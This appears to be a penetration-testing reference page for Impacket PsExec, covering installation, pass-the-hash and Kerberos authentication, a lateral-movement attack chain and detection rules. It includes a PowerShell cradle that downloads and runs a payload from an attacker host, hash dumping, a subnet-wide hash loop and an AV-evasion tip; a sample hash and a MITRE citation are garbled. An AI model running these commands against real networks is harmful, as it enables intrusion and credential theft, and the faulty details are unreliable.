---
title: "Impacket PsExec"
category: "Lateral Movement"
tool_name: "impacket-psexec"
version: "0.13.1"
kali_package: "python3-impacket"
install_size: "7.31 MB"
language: "Python"
author: "Fortra (Core Security)"
license: "Apache-2.0"
github: "https://github.com/fortra/impacket"
kali_url: "https://www.kali.org/tools/impacket/"
mitre_tactic: "lateral_movement"
mitre_tactic_id: "TA0008"
tags: ["lateral_movement", "smb", "psexec", "remote-execution", "ntlm", "pass-the-hash", "windows", "impacket", "named-pipe"]
date: "2026-07-18"
---

# Impacket PsExec — SMB-Based Remote Command Execution with Named Pipes

## 1. Overview

**Impacket PsExec** is the Python implementation of Sysinternals PsExec, providing remote command execution on Windows systems via SMB and the Service Control Manager (SCM). It uploads a service executable (`psexesvc.exe`) to the target's `ADMIN$` share, creates a Windows service to run it, and establishes a named pipe for bidirectional command I/O. This gives a fully interactive `cmd.exe` session on the remote host.

PsExec is the most recognizable lateral movement tool in penetration testing. It is loud — it drops a binary, creates a service, and opens a named pipe — but it is universally effective against Windows systems with SMB access and local administrator credentials. Impacket's implementation adds pass-the-hash and Kerberos support, making it functional in domain environments without plaintext passwords.

### Core Capabilities

- **Full interactive shell** via `cmd.exe` through named pipes
- **Pass-the-hash authentication** with NTLM hash pairs
- **Kerberos authentication** with AES keys or ccache files
- **Binary upload and service creation** for reliable remote execution
- **Bidirectional I/O** through the named pipe channel
- **Single command execution** for scripted operations
- **Share targeting** for output retrieval
- **Debug mode** for protocol-level troubleshooting

### When to Use PsExec

- Full interactive shell access on remote Windows hosts
- Lateral movement with known local administrator credentials
- Post-exploitation requiring interactive command processing
- Running batch scripts or sequential commands on remote systems
- Domain environments where SMB is open between hosts
- Lab environments for practicing Windows lateral movement
- engagements requiring visible, well-documented remote execution

### Comparison with Other Tools

| Feature | PsExec (Impacket) | PsExec (Sysinternals) | SMBExec | WMIExec |
|---------|-------------------|----------------------|---------|---------|
| Interactive shell | Yes (named pipe) | Yes (named pipe) | Semi-interactive | Semi-interactive |
| Binary upload | Yes | Yes | No | No |
| Pass-the-hash | Yes | No | Yes | Yes |
| Kerberos support | Yes | No | Yes | Yes |
| Named pipe | Yes | Yes | No | No |
| EDR detection | High | High | Medium | Low |
| Requires upload | Yes | Yes | No | No |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install python3-impacket
```

**Explanation:** Installs the full Impacket suite including PsExec. The package includes all dependencies: `python3-openssl`, `python3-pycryptodome`, `python3-pyasn1`, `python3-ldap3`, and `python3-flask`.

### From Source

```bash
git clone https://github.com/fortra/impacket.git /opt/impacket
cd /opt/impacket
pip3 install .
```

**Explanation:** Clones the upstream Fortra repository and installs from source. Required for the latest development version or custom modifications.

### Using pipx

```bash
python3 -m pipx install impacket
```

**Explanation:** Recommended for system-wide installation. pipx isolates the virtual environment and avoids conflicts with system Python packages.

### Verifying Installation

```bash
impacket-psexec -h
```

**Explanation:** Displays the help screen. If this produces usage output, the installation is correct. The banner shows the Impacket version.

---

## 3. Command Reference

### 3.1 Basic Authentication (Username/Password)

```bash
impacket-psexec administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Authenticates to the target using plaintext credentials over SMB. Uploads `psexesvc.exe` to `ADMIN$`, creates a Windows service, and opens a named pipe for interactive `cmd.exe` access. The shell prompt shows `C:\Windows\system32>` by default.

### 3.2 Pass-the-Hash Authentication

```bash
impacket-psexec -hashes :NTHASH administrator@192.168.1.10
```

**Explanation:** Authenticates using an NTLM hash without knowing the plaintext password. The LM hash portion can be empty (`aad3b435b51404eeaad3b435b51404ee`) or omitted. This is the primary use case for PsExec in penetration testing — leveraging extracted hashes for lateral movement.

#### Full Pass-the-Hash Syntax

```bash
# NT hash only (LM = empty)
impacket-psexec -hashes :334d1cdc94243215df022b101e206e administrator@192.168.1.10

# Full LM:NT pair
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:334d1cdc94243215df022b101e206e administrator@192.168.1.10

# Domain authentication
impacket-psexec -hashes :NTHASH DOMAIN/administrator@192.168.1.10

# With explicit target IP (when target is NetBIOS name)
impacket-psexec -hashes :NTHASH DOMAIN/administrator@SERVER01 -target-ip 192.168.1.10
```

### 3.3 Kerberos Authentication

```bash
impacket-psexec -k -no-pass DOMAIN/administrator@192.168.1.10
```

**Explanation:** Uses Kerberos authentication from the ccache file in `KRB5CCNAME`. The `-no-pass` flag prevents password prompts. Kerberos is stealthier than NTLM as it avoids NTLM-specific detection mechanisms.

#### Kerberos with AES Key

```bash
impacket-psexec -aesKey 000102030405060708090a0b0c0d0e0f -k DOMAIN/administrator@192.168.1.10
```

**Explanation:** Authenticates using an AES-256 key for Kerberos. AES keys are extracted from Kerberos tickets or Active Directory attributes. More stealthy than NTLM hash authentication.

#### Kerberos with Ccache

```bash
export KRB5CCNAME=/tmp/administrator.ccache
impacket-psexec -k -no-pass DOMAIN/administrator@dc01.domain.local
```

**Explanation:** Sets the ccache file containing a TGT and authenticates using Kerberos. Use `dc-ip` if DNS resolution is unavailable.

### 3.4 Domain Authentication with DC-IP

```bash
impacket-psexec -hashes :NTHASH DOMAIN/administrator@192.168.1.10 -dc-ip 192.168.1.5
```

**Explanation:** Specifies the domain controller IP directly. Required when the DC cannot be resolved via DNS or when the target hostname does not match DNS records.

### 3.5 Single Command Execution

```bash
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "whoami"
```

**Explanation:** Executes a single command on the target and exits. Useful for scripting and automation where an interactive shell is not needed.

#### Single Command Examples

```bash
# System information
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "systeminfo"

# Process listing
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "tasklist /svc"

# Network configuration
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "ipconfig /all"

# Domain enumeration
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "net user /domain"

# Run a remote script
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "C:\temp\recon.bat"

# PowerShell execution
impacket-psexec -hashes :NTHASH administrator@192.168.1.10 "powershell -c \"Get-Process\""
```

### 3.6 Interactive Shell Usage

```bash
impacket-psexec administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Opens a fully interactive `cmd.exe` shell. Unlike SMBExec's semi-interactive mode, this uses a named pipe for bidirectional communication, providing a more natural shell experience.

#### Interactive Shell Features

```text
C:\Windows\system32> whoami
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
C:\Users\Administrator\Desktop> type passwords.txt
C:\Users\Administrator\Desktop> net user
C:\Users\Administrator\Desktop> net localgroup administrators
C:\Users\Administrator\Desktop> exit
```

### 3.7 Share Configuration

```bash
impacket-psexec -share C$ administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Uses the `C$` share instead of the default `ADMIN$` for uploading the service executable and reading output. Useful when `ADMIN$` is restricted.

### 3.8 Debug and Timestamp Output

```bash
impacket-psexec -debug -ts administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Enables debug output (`-debug`) showing all protocol-level communication, and timestamps (`-ts`) each log line. Essential for troubleshooting authentication failures or protocol errors.

### 3.9 Codec Configuration

```bash
impacket-psexec -codec cp850 administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Sets the encoding used for target output. Default is `utf-8`. On systems with non-UTF-8 output (e.g., German Windows with cp850), run `chcp.com` on the target to identify the correct code page.

---

## 4. Authentication Methods

### Pass-the-Hash Workflow

```text
1. Extract hashes (secretsdump, Mimikatz, SAM dump)
   └─ LMHASH:NTHASH

2. Authenticate to target
   └─ impacket-psexec -hashes LMHASH:NTHASH user@target

3. Binary upload and service creation
   └─ psexesvc.exe uploaded to ADMIN$
   └─ Service created and started

4. Named pipe established
   └─ Interactive cmd.exe shell
```

### NTLM Hash Format

```text
LMHASH:NTHASH

Common LM hashes:
- Empty/disabled LM: aad3b435b51404eeaad3b435b51404ee
- No LM history:    aad3b435b51404eeaad3b435b51404ee

Example:
aad3b435b51404eeaad3b435b51404ee:334d1cdc94243215df022b101e206e
```

### Kerberos Authentication Requirements

| Component | Requirement |
|-----------|-------------|
| Ccache file | Valid TGT in `KRB5CCNAME` |
| AES key | 128 or 256-bit hex key |
| DC resolution | DNS or `-dc-ip` parameter |
| SPN | Target service must be registered in AD |
| Time sync | Target and DC must be within 5 minutes |

### Authentication Matrix

| Method | Credentials | Flag | Use Case |
|--------|-------------|------|----------|
| Password | `user:password@target` | None | Known credentials |
| Pass-the-Hash | `-hashes LM:NT user@target` | `-hashes` | Hash extraction |
| Kerberos ccache | `user@target -k` | `-k -no-pass` | Domain environments |
| Kerberos AES | `-aesKey key user@target` | `-aesKey -k` | Stealthy domain auth |
| Keytab | `user@target -k -keytab file` | `-keytab -k` | Service accounts |

---

## 5. Attack Chain Integration

### Step 1: Credential Harvesting

```bash
# Dump SAM hashes from a compromised Windows host
impacket-secretsdump administrator:'P@ssw0rd'@192.168.1.10

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:HASH:::
```

**Explanation:** Extracts local account hashes from the SAM database. The LM:NTHASH pair is needed for pass-the-hash authentication.

### Step 2: Lateral Movement with PsExec

```bash
# Use the extracted hash to move laterally
impacket-psexec -hashes :334d1cdc94243215df022b101e206e administrator@192.168.1.20
```

**Explanation:** Authenticates to a second host using the harvested NTLM hash. The target must have the same administrator account or the hash must match a local admin on the target.

### Step 3: Interactive Shell

```text
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
SERVER02

C:\Windows\system32> ipconfig /all
[Network configuration output]

C:\Windows\system32> net user
[User listing]

C:\Windows\system32> dir C:\Users\Administrator\Desktop
[File listing]
```

**Explanation:** Enumerate the target system, check privileges, and locate sensitive files. The interactive shell supports standard cmd.exe commands.

### Step 4: Establish Persistent Access

```bash
# Upload a reverse shell or C2 agent
impacket-psexec -hashes :HASH administrator@192.168.1.20 "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')\""
```

**Explanation:** Executes a PowerShell download cradle through PsExec to fetch and execute a payload from the attacker machine.

### Step 5: Further Lateral Movement

```bash
# Harvest hashes from the new target
impacket-secretsdump -hashes :HASH administrator@192.168.1.20@192.168.1.30

# Use new credentials for additional movement
impacket-psexec -hashes :NEW_HASH administrator@192.168.1.40
```

**Explanation:** Chain PsExec with secretsdump to pivot through the network, extracting credentials from each compromised host and using them to reach additional targets.

---

## 6. Advanced Use Cases

### Domain-Wide Lateral Movement

```bash
# After dumping NTDS.dit from DC
impacket-secretsdump -hashes :HASH DOMAIN/administrator@192.168.1.5 -just-dc

# Use domain admin hash against multiple hosts
for host in 192.168.1.{10..50}; do
    echo "=== $host ==="
    impacket-psexec -hashes :DOMAIN_ADMIN_HASH DOMAIN/administrator@$host "hostname" 2>/dev/null
done
```

**Explanation:** Domain admin credentials work across all domain-joined hosts. This loop tests reachability and identifies live hosts.

### Remote Script Execution

```bash
# Upload and execute a batch script
impacket-psexec -hashes :HASH administrator@192.168.1.10 "cmd /c \\192.168.1.5\share\recon.bat"

# Upload and execute PowerShell script
impacket-psexec -hashes :HASH administrator@192.168.1.10 "powershell -ExecutionPolicy Bypass -File C:\temp\enum.ps1"
```

**Explanation:** Execute batch or PowerShell scripts on remote hosts. The script must be accessible from the target (via UNC path or uploaded first).

### Named Pipe Interaction

```bash
# PsExec creates a named pipe for communication
# The pipe name is generated automatically
# Monitor with: pipelist.exe (from Sysinternals)
# Or: Get-ChildItem \\.\pipe\
```

**Explanation:** PsExec creates a named pipe for bidirectional I/O. This is the primary detection vector — EDR tools monitor named pipe creation patterns.

### Codec Troubleshooting

```bash
# On the target, check code page
chcp.com

# If output shows code page 850
impacket-psexec -codec cp850 administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Non-English Windows systems use different code pages. The `-codec` flag ensures proper decoding of command output.

---

## 7. Detection and Defense

### PsExec Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| Binary upload to ADMIN$ | File integrity monitoring on `C:\Windows\ADMIN$` |
| Service creation events | Windows Event ID 7045 (new service installed) |
| Named pipe creation | Windows Event ID 5140 (network share access) |
| `psexesvc.exe` on disk | File hash matching (known PsExec binary) |
| SMB connections to ADMIN$ | Network monitoring on TCP 445 |
| Service start/stop | Windows Event ID 7036 |
| NTLM authentication | Windows Event ID 4624 (Logon Type 3) |
| Process creation | Windows Event ID 4688 (process creation with command line) |

### Network Detection

```bash
# Wireshark filter for PsExec traffic
tcp.port == 445 && smb2

# Suricata rule (conceptual)
alert smb any any -> any any (msg:"PsExec Service Binary Upload"; \
    content:"psexesvc"; sid:1000002;)

# Zeek detection
export HIGHLIGHT_PSEXEC=T
```

### Blue Team Detection Queries

```text
# Splunk: Detect PsExec binary
index=windows EventCode=11 file_name="psexesvc.exe"
| stats count by Computer, TargetFileName, Hashes

# Elastic: Detect service creation via PsExec
event_id:7045 AND service_name:"PSEXESVC*"
| stats count by host, winlog.event_data.ServiceName

# Splunk: Detect named pipe creation
index=windows EventCode=5140 ShareName="\\\\*\\IPC$" | 
    search RelativeTargetName="PSEXESVC*"
```

### Preventive Controls

```text
# Disable SMBv1 (reduces attack surface)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Restrict SMB access with Windows Firewall
New-NetFirewallRule -DisplayName "Block SMB Lateral" -Direction Inbound \
    -Protocol TCP -LocalPort 445 -RemoteAddress 10.0.0.0/8 -Action Block

# Enable LSA protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Disable NTLM where possible
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictReceivingNTLMTraffic /t REG_DWORD /d 2 /f

# Audit service creation
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# AppLocker / WDAC to block PSEXESVC.exe
# Group Policy: Software Restriction Policies
```

---

## 8. Operational Considerations

### Advantages

- **Full interactive shell:** Named pipe provides bidirectional `cmd.exe` access
- **Universal effectiveness:** Works against any Windows system with SMB and local admin
- **Well-documented:** Extensive community knowledge and troubleshooting resources
- **Flexible authentication:** Password, pass-the-hash, and Kerberos support

### Limitations

- **Binary upload required:** Drops `psexesvc.exe` to disk — detectable by AV/EDR
- **Service creation logged:** Windows Event ID 7045 records the service installation
- **Named pipe detected:** EDR tools monitor named pipe creation patterns
- **SMB required:** Port 445 must be accessible between attacker and target
- **Admin credentials needed:** Requires local administrator or SYSTEM-level access
- **No stealth:** This is the most well-known lateral movement tool; signature-based detection is trivial

### Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| `STATUS_LOGON_FAILURE` | Wrong password or hash | Verify credentials; try `-debug` |
| `STATUS_ACCESS_DENIED` | Insufficient privileges | Ensure local admin access |
| `STATUS_PIPE_NOT_AVAILABLE` | Named pipe blocked | Try SMBExec instead (no named pipe) |
| Binary detected by AV | Signature-based detection | Modify binary or use SMBExec |
| `Connection reset` | Firewall blocking | Check port 445 connectivity |
| `KDC_ERR_PREAUTH_FAILED` | Wrong AES key or no TGT | Verify Kerberos setup |
| `STATUS_BAD_NETWORK_NAME` | Share doesn't exist | Try `-share C$` |

### Best Practices

- Use pass-the-hash only within the engagement scope (NTLM relay can propagate)
- Document all hashes used and targets accessed for the final report
- Verify target reachability with `impacket-smbclient` before attempting execution
- Use `-debug` during initial testing to identify authentication issues
- Combine with `secretsdump` for credential harvesting on each new host
- Clean up `psexesvc.exe` after engagement (though it is typically cleaned by the service)
- Monitor for Event ID 7045 on targets during testing
- Test AV detection of PsExec binary before operational use

---

## Resources

- **Impacket GitHub:** https://github.com/fortra/impacket
- **Impacket Wiki:** https://github.com/fortra/impacket/wiki
- **Kali Linux Tool Page:** https://www.kali.org/tools/impacket/
- **MITRE ATT&CK Lateral Movement (TA0008):** https://attack.mitre.org/tactics/TA0008/
- **MITRE ATT&CK Windows Management Instrumentation (T1024):** https://attack.mitre.org/techniques/T1021/002/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **OffSec PEN-300 Course:** https://www.offsec.com/courses/pen-300/
- **Microsoft SMB Protocol Documentation:** https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol
- **Sysinternals PsExec Documentation:** https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
